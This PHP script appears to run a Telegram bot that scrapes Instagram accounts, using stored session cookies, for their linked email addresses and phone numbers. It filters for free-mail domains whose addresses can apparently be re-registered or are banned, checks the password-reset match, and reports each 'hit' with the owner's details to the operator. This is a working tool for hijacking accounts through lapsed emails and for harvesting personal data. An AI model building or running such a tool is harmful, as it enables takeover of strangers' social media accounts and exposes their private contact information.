<?php
date_default_timezone_set('Asia/Baghdad');
$config = json_decode(file_get_contents('config.json'),1);
$id = $config['id'];
$token = $config['token'];
$config['filter'] = $config['filter'] != null ? $config['filter'] : 1;
$screen = file_get_contents('screen');
exec('kill -9 ' . file_get_contents($screen . 'pid'));
file_put_contents($screen . 'pid', getmypid());
include 'bot.php';
$accounts = json_decode(file_get_contents('accounts.json') , 1);
$cookies = $accounts[$screen]['cookies'];
$useragent = $accounts[$screen]['useragent'];
$users = explode("\n", file_get_contents($screen));
$uu = explode(':', $screen) [0];
$se = 100;
$i = 0;
$gmail = 0;
$hotmail = 0;
$yahoo = 0;
$mailru = 0;
$aol = 0;
$true = 0;
$saraa = 1;
$false = 0;
$E77710 = 0;

$E77711 = 0;
$NotBussines = 0;
function verfmatch($email){
    $check_mail = inInsta($email);
    if ($check_mail !== false) {
   if(strstr($email,"@gmail.com")){
     $ban = check_ban($email);
      if($ban == "Yes"){
         return "Good";
          }
      }else{
    return "Good";
      }
    }else{
     print_r($check_mail);
    }
  }
$edit = bot('sendMessage',[
    'chat_id'=>$id,
    'text'=>"*جاري الفحص 🙂:-*",
    'parse_mode'=>'markdown',
    'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [['text'=>'𝖈𝖍𝖊𝖈𝖐𝖊𝖉  : '.$i,'callback_data'=>'fgf']],
                [['text'=>'𝖔𝖒 𝖚𝖘𝖊𝖗 : '.$user,'callback_data'=>'fgdfg']],
                [['text'=>'𝖊𝖒𝖆𝖎𝖑 𖤢: '.$mail,'callback_data'=>'ghj']],
                [['text'=>"𝖌𝖒𝖆𝖎𝖑: $gmail",'callback_data'=>'dfgfd'],['text'=>"𝖞𝖆𝖍𝖔𝖔: $yahoo",'callback_data'=>'gdfgfd']],
                [['text'=>'𝖒𝖆𝖎𝖑𝖗𝖚: '.$mailru,'callback_data'=>'fgd'],['text'=>'𝖍𝖔𝖙𝖒𝖆𝖎𝖑: '.$hotmail,'callback_data'=>'ghj']],
                [['text'=>'𝖆𝖔𝖑𝚘𝚕: '.$aol,'callback_data'=>'fahmyaol']],
                [['text'=>'𝖑𝖎𝖛𝖆 ✅ : '.$true,'callback_data'=>'gj'],['text'=>'𝖉𝖎𝖊𝖉 ❎: '.$false,'callback_data'=>'dghkf']],
                [['text'=>'- 𝖓𝖔 𝖗𝖊𝖘𝖙  𖤪. : '.$E77711,'callback_data'=>'E77711']],
				[['text'=>'- 𝖇𝖑𝖆𝖈𝖐𝖑𝖎𝖘𝖗 ⇭. : '.$E77710,'callback_data'=>'E77710']],
				[['text'=>'-𝖓𝖔𝖙𝖇𝖚𝖘𝖎𝖓𝖊𝖘𝖘 𖢺. : '.$NotBussines,'callback_data'=>'dgdge'],['text'=>'-𝖇𝖚𝖘𝖎𝖒𝖊𝖘𝖘 𖣈. : '.$false,'callback_data'=>'dghkf']],
            ]
        ])
]);
$se = 100;
$editAfter = 1;
foreach ($users as $user) {
    $info = getInfo($user, $cookies, $useragent);
    if ($info != false and !is_string($info)) {
        $mail = trim($info['mail']);
        $phone = trim($info['phone']);
        $usern = $info['user'];
        $e = explode('@', $mail);
               if (preg_match('/(hotmail|outlook|yahoo|Yahoo|yAhoo|aol|aOl|Aol|gmX|gMx|Gmx|protonmail|mail)\.(.*)|(gmail)\.(com)|(mail|bk|yandex|inbox|list)\.(ru)/i', $mail,$m)) {
            echo 'check ' . $mail . PHP_EOL;
                       if(checkMail($mail)){
                        $inInsta = verfmatch($mail);
                        if ($inInsta == "Good") {
                            // if($config['filter'] <= $follow){
                                echo "True - $user - " . $mail . "\n";
                                if(strpos($mail, 'gmail.com')){
                                    $gmail += 1;
                                } elseif(strpos($mail, 'hotmail.') or strpos($mail,'outlook.')){
                                    $hotmail += 1;
                                } elseif(strpos($mail, 'yahoo')){
                                    $yahoo += 1;
                                } elseif(strpos($mail, 'aol')){
                                    $aol += 1;
                                } elseif(strpos($mail, 'gmx')){
                                    $gmx += 1;
								}  elseif(strpos($mail, 'protonmail')){
                                    $protonmail += 1;
							
                                } elseif(preg_match('/(mail|bk|yandex|inbox|list)\.(ru)/i', $mail)){
                                    $mailru += 1;
                                }
                                $follow = $info['f'];
                                $following = $info['ff'];
                                $media = $info['m'];
                                bot('sendMessage', ['disable_web_page_preview' => true, 'chat_id' => $id, 'text' => "* 𝒉𝒊 𝒔𝒊𝒓 𝒏𝒆𝒘 𝒇𝒖𝒄𝒌𝒆𝒅✅ 𖤧   ❖ - 𝖍𝖎𝖙  [$saraa] * \n↣↣↣↣↣↣↣↣↣↣↣\n* .♟.𝖚𝖘𝖊𝖗 :* `$usern` \n* .♟.𝖊𝖒𝖆𝖎𝖑 :* `$mail` \n* .♟.𝖋𝖔𝖑𝖑𝖔𝖜𝖊𝖗𝖘: * $follow\n* .♟.𝖋𝖔𝖑𝖑𝖔𝖜𝖎𝖓𝖌 : * $following\n* .♟𝖕𝖔𝖘𝖙 :* $media\n* .♟.𝖙𝖎𝖒𝖊 : ".date("Y")."/".date("n")."/".date("d")." : " . date('g:i') . "\n* .♟.𝖕𝖍𝖔𝖓𝖊 𝖞𝖚𝖒𝖇𝖊𝖗 : [$phone]\n .↣↣↣↣↣↣↣↣↣↣↣\n*𝖈𝖍 :* [@E77711]\n*𝖇𝖞 :* [@E77710]",
                                
                                'parse_mode'=>'markdown']);
                                
                                bot('editMessageReplyMarkup',[
                                    'chat_id'=>$id,
                                    'message_id'=>$edit->result->message_id,
                                    'reply_markup'=>json_encode([
                                        'inline_keyboard'=>[
                                            [['text'=>'𝙲𝚑𝚎𝚌𝚔𝚎𝚍  : '.$i,'callback_data'=>'fgf']],
                [['text'=>'𝖈𝖍𝖊𝖈𝖐𝖊𝖉  : '.$i,'callback_data'=>'fgf']],
                [['text'=>'𝖔𝖒 𝖚𝖘𝖊𝖗 : '.$user,'callback_data'=>'fgdfg']],
                [['text'=>'𝖊𝖒𝖆𝖎𝖑 𖤢: '.$mail,'callback_data'=>'ghj']],
                [['text'=>"𝖌𝖒𝖆𝖎𝖑: $gmail",'callback_data'=>'dfgfd'],['text'=>"𝖞𝖆𝖍𝖔𝖔: $yahoo",'callback_data'=>'gdfgfd']],
                [['text'=>'𝖒𝖆𝖎𝖑𝖗𝖚: '.$mailru,'callback_data'=>'fgd'],['text'=>'𝖍𝖔𝖙𝖒𝖆𝖎𝖑: '.$hotmail,'callback_data'=>'ghj']],
                [['text'=>'𝖆𝖔𝖑𝚘𝚕: '.$aol,'callback_data'=>'fahmyaol']],
                [['text'=>'𝖑𝖎𝖛𝖆 ✅ : '.$true,'callback_data'=>'gj'],['text'=>'𝖉𝖎𝖊𝖉 ❎: '.$false,'callback_data'=>'dghkf']],
                [['text'=>'- 𝖓𝖔 𝖗𝖊𝖘𝖙  𖤪. : '.$E77711,'callback_data'=>'E77711']],
				[['text'=>'- 𝖇𝖑𝖆𝖈𝖐𝖑𝖎𝖘𝖗 ⇭. : '.$E77710,'callback_data'=>'E77710']],
				[['text'=>'-𝖓𝖔𝖙𝖇𝖚𝖘𝖎𝖓𝖊𝖘𝖘 𖢺. : '.$NotBussines,'callback_data'=>'dgdge'],['text'=>'-𝖇𝖚𝖘𝖎𝖒𝖊𝖘𝖘 𖣈. : '.$false,'callback_data'=>'dghkf']],
                                        ]
                                    ])
                                ]);
                                $true += 1;
                                $saraa += 1;
                            // } else {
                            //     echo "Filter , ".$mail.PHP_EOL;
                            // }
                            
                        } else {
                        	$E77711 +=1;
                          echo "No Rest $mail\n";
                        }
                    } else {
                        $false +=1;
                        echo "Not Vaild 2 - $mail\n";
                    }
        } else {
        	$E77710 +=1;
          echo "BlackList - $mail\n";
        }
    }elseif(is_string($info)){
        bot('sendMessage',[
            'chat_id'=>$id,
            'text'=>"الحساب - `$screen`\n تم حظره من *الفحص*.",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                        [['text'=>'نقل اللستة الى حساب ثاني','callback_data'=>"moveList&$screen"]],
                        [['text'=>'حذف الحساب','callback_data'=>'del&'.$screen]]
                    ]    
            ]),
            'parse_mode'=>'markdown'
        ]);
        exit;
    } else {
         $NotBussines +=1;
        echo "NotBussines - $user\n";
    }
    usleep(900000);
    $i++;
    file_put_contents($screen, str_replace($user, '', file_get_contents($screen)));
    file_put_contents($screen, preg_replace("/(^[\r\n]*|[\r\n]+)[\s\t]*[\r\n]+/", "", file_get_contents($screen)));
    if($i == $editAfter){
        bot('editMessageReplyMarkup',[
            'chat_id'=>$id,
            'message_id'=>$edit->result->message_id,
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                [['text'=>'𝖈𝖍𝖊𝖈𝖐𝖊𝖉  : '.$i,'callback_data'=>'fgf']],
                [['text'=>'𝖔𝖒 𝖚𝖘𝖊𝖗 : '.$user,'callback_data'=>'fgdfg']],
                [['text'=>'𝖊𝖒𝖆𝖎𝖑 𖤢: '.$mail,'callback_data'=>'ghj']],
                [['text'=>"𝖌𝖒𝖆𝖎𝖑: $gmail",'callback_data'=>'dfgfd'],['text'=>"𝖞𝖆𝖍𝖔𝖔: $yahoo",'callback_data'=>'gdfgfd']],
                [['text'=>'𝖒𝖆𝖎𝖑𝖗𝖚: '.$mailru,'callback_data'=>'fgd'],['text'=>'𝖍𝖔𝖙𝖒𝖆𝖎𝖑: '.$hotmail,'callback_data'=>'ghj']],
                [['text'=>'𝖆𝖔𝖑𝚘𝚕: '.$aol,'callback_data'=>'fahmyaol']],
                [['text'=>'𝖑𝖎𝖛𝖆 ✅ : '.$true,'callback_data'=>'gj'],['text'=>'𝖉𝖎𝖊𝖉 ❎: '.$false,'callback_data'=>'dghkf']],
                [['text'=>'- 𝖓𝖔 𝖗𝖊𝖘𝖙  𖤪. : '.$E77711,'callback_data'=>'E77711']],
				[['text'=>'- 𝖇𝖑𝖆𝖈𝖐𝖑𝖎𝖘𝖗 ⇭. : '.$E77710,'callback_data'=>'E77710']],
				[['text'=>'-𝖓𝖔𝖙𝖇𝖚𝖘𝖎𝖓𝖊𝖘𝖘 𖢺. : '.$NotBussines,'callback_data'=>'dgdge'],['text'=>'-𝖇𝖚𝖘𝖎𝖒𝖊𝖘𝖘 𖣈. : '.$false,'callback_data'=>'dghkf']],
                ]
            ])
        ]);
        $editAfter += 1;
    }
}
bot('sendMessage', ['chat_id' => $id, 'text' =>" تم الانتهاء من الفحص    : ".explode(':',$screen)[0]]);

